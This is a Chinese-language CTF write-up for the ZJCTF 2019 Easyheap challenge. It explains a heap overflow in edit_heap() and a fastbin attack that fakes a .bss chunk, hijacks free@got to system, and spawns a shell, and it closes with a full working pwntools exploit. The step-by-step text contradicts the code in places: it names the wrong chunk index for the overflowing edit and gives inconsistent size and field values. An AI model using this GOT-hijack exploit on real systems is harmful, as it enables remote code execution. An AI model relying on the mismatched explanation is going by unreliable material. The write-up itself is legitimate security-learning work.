# 漏洞利用文档：heap23_17_ZJCTF_2019_Easyheap

# 执行环境
- 运行环境
  - Ubuntu 16.04 (x86_64)
  - libc 2.23
- 缓解措施
  - ASLR: On
  - PIE: Off (程序未开启PIE，基地址为0x400000)
  - NX: On (堆栈不可执行)
  - RELRO: Partial RELRO (GOT表可写)
  - Canary: On (但栈溢出非本漏洞利用路径)
  - FORTIFY: Off

# 漏洞成因
## 程序关键结构体
程序在`.bss`段维护一个全局的堆指针数组 `heaparray`，用于管理最多10个堆块。
```c
void *heaparray[10]; // 位于.bss段，地址 0x6020C0
```

## 漏洞定位
`edit_heap()` 函数中存在 **堆溢出** 漏洞。
```c
unsigned __int64 edit_heap()
{
    // ...
    printf("Size of Heap : ");
    read(0, buf, 8u);
    v2 = atoi(buf); // v2为用户输入的任意大小
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2); // 向堆指针指向的地址写入v2字节，未检查原始chunk大小
    // ...
}
```
该函数允许用户为指定索引的堆块输入一个`size`，并写入`size`字节的内容，但并未检查该`size`是否小于或等于堆块被创建时的原始大小。如果用户输入的`size`大于chunk的实际大小，就会导致**堆溢出**，覆盖相邻堆块的数据。

# 漏洞利用过程：
本漏洞利用的核心目标是：**通过堆溢出伪造Fastbin Chunk，利用Fastbin Attack实现任意地址写，最终劫持`free@got.plt`为`system`的地址，并通过释放一个内容为`/bin/sh`的堆块来获得shell。**

- Step1: 创建三个相同大小(0x68)的堆块，进行初始堆布局。
- Step2: 释放第三个堆块，使其进入Fastbin。
- Step3: 通过堆溢出第一个堆块，覆盖第二个堆块的数据，伪造一个位于`.bss`段(`0x6020ad`)的`free`chunk，并将其`fd`指针指向它。
- Step4: 申请两个堆块，第二个堆块将从伪造的`.bss`地址处分配，从而获得一个可写的、位于`heaparray`附近的指针。
- Step5: 编辑在`.bss`段分配的堆块，覆盖`heaparray[0]`为`free@got.plt`的地址。
- Step6: 编辑`heaparray[0]`（即`free@got.plt`），将其内容改为`system@plt`的地址。
- Step7: 释放一个内容为`/bin/sh`的堆块，此时实际调用的是`system('/bin/sh')`。

## Step1 (初始布局)
- `heaparray[0]` = `0x17a1010` (chunk0: size=0x71)
- `heaparray[1]` = `0x17a1080` (chunk1: size=0x71)
- `heaparray[2]` = `0x17a10f0` (chunk2: size=0x71)
- 原因：程序连续创建了三个大小为0x68的用户堆块，每个chunk的实际大小为`0x70`（包含chunk头），加上对齐，总分配大小为`0x71`。

## Step2 (释放chunk2)
- 堆内存`0x17a10e0` (chunk2的`fd`指针域): 此前是用户数据`'6666...'`，现在变为`0x00`。
- 原因：`free(chunk2)` 将其链入大小为`0x70`的fastbin单链表，此时链表中仅此一个chunk，其`fd`为`NULL(0)`。

## Step3 (堆溢出伪造fd)
- 堆内存`0x17a1080` (chunk1的`prev_size`和`size`域): 此前是`0x00`和`0x71`，现在被覆盖为`0x0068732f6e69622f ('/bin/sh\x00')`和`0x71`。这是为了后续作为`system`的参数。
- 堆内存`0x17a10e0` (chunk2的`fd`指针域): 此前是`0x00`，现在被覆盖为`0x6020ad`。
- 原因：编辑chunk0时，输入了超过其自身大小(0x68)的数据。溢出部分覆盖了chunk1的用户数据区和chunk2的chunk头及`fd`指针。我们精心构造了溢出数据：在chunk1处写入`/bin/sh`，并在chunk2的`fd`位置写入一个伪造的chunk地址`0x6020ad`。`0x6020ad`这个地址位于`.bss`段的`heaparray`附近，其对应的`size`位(`0x6020a8`)可以通过调试确定为`0x00000000000000??`，只要低字节为`0x7f`即可绕过fastbin的`size`检查（`malloc`会检查`size`是否与fastbin大小匹配）。此时，fastbin链表变为: `head -> chunk2(addr: 0x17a10f0) -> fake_chunk(addr: 0x6020ad)`。

## Step4 (申请伪造chunk)
- `heaparray[2]` (重新赋值): 此前为`0x17a10f0`，现在变为`0x17a10f0` (第一次`malloc`分配了原chunk2)。
- `heaparray[3]` (新增): 变为`0x6020bd`。
- 原因：第一次`add(0x68)`从fastbin头部取出了chunk2，归还给用户。第二次`add(0x68)`时，fastbin头部指向我们伪造的chunk(`0x6020ad`)，`malloc`会尝试在`0x6020ad`处“分配”一个chunk给用户。由于`0x6020ad`在`.bss`段，我们从而获得了一个可以写`.bss`段的指针，并存储在`heaparray[3]`。

## Step5 (篡改heaparray[0])
- 全局变量`0x6020c0` (`heaparray[0]`): 此前为`0x17a1010`，现在被覆盖为`0x602018` (即`free@got.plt`的地址)。
- 原因：编辑`heaparray[3]` (即地址`0x6020bd`处的chunk)。`0x6020bd`距离`heaparray`起始地址`0x6020c0`有`0x23`字节的偏移。通过向`0x6020bd`写入`'\x00'*0x23 + p64(elf.got['free'])`，可以刚好覆盖到`heaparray[0]`，使其指向`free`函数的GOT表项。

## Step6 (劫持free@got为system)
- 全局变量`0x602018` (`free@got.plt`): 此前为`0x4006c6` (`free`的plt指令地址或已解析的libc地址)，现在被覆盖为`0x4006a0` (`system@plt`的地址)。
- 原因：编辑`heaparray[0]`，而它现在指向`free@got.plt`。我们向其写入`system@plt`的地址，从而完成了GOT表项的劫持。之后所有调用`free`的地方都将跳转到`system`。

## Step7 (触发system('/bin/sh'))
- 原因：调用`free(heaparray[1])`。`heaparray[1]`指向的chunk内容在Step3已被我们设置为字符串`'/bin/sh\x00'`。由于`free`的GOT表项已被篡改为`system`，实际执行的是`system(0x17a1080)`，而`0x17a1080`处正是`'/bin/sh\x00'`，从而成功获得shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_17_ZJCTF_2019_Easyheap')
elf = ELF('./data/bin/heap23_17_ZJCTF_2019_Easyheap')
libc = elf.libc

def add(size,content):
    p.sendlineafter(':','1')
    p.sendlineafter(':',str(size))
    p.sendafter(':',content)

def edit(idx, content):
    p.sendlineafter(':','2')
    p.sendlineafter(':',str(idx))
    p.sendlineafter(':',str(len(content)))
    p.sendafter(':',content)

def free(idx):
    p.sendlineafter(':','3')
    p.sendlineafter(':',str(idx))

# Step1: 创建三个初始堆块
add(0x68, b'6')
add(0x68, b'6')
add(0x68, b'6')

# Step2: 释放第三个块，使其进入fastbin
free(2)

# Step3: 堆溢出！通过编辑chunk0，覆盖chunk1的内容为`/bin/sh`，并覆盖chunk2的fd指针。
# 0x6020ad是.bss段的一个地址，其对应的size字段(0x6020a8)的低字节通常为0x??7f，可以绕过fastbin的size检查。
edit(1, b'/bin/sh\x00' + b'\x00'*0x60 + p64(0x71) + p64(0x6020ad))

# Step4: 申请两个堆块。第一个会取回原来的chunk2，第二个则会从我们伪造的fd(0x6020ad)处分配。
# 从而我们获得了一个在.bss段(heaparray附近)的可写指针(heaparray[3])。
add(0x68, b'6')
add(0x68, b'6')

# Step5: 利用在.bss段分配的chunk(heaparray[3])，覆盖heaparray[0]为free@got.plt的地址。
# 0x6020bd (heaparray[3]的用户数据区) 与 0x6020c0 (heaparray[0]) 的偏移为0x23。
edit(3, b'\x00'*0x23 + p64(elf.got['free']))

# Step6: 现在heaparray[0]指向free@got.plt。通过编辑chunk0，我们将free@got.plt的内容改写为system@plt的地址。
edit(0, p64(elf.plt['system']))

# Step7: 调用free(heaparray[1])。由于free已被劫持为system，而heaparray[1]的内容是`/bin/sh`，因此实际执行system("/bin/sh")。
free(1)

p.interactive()
```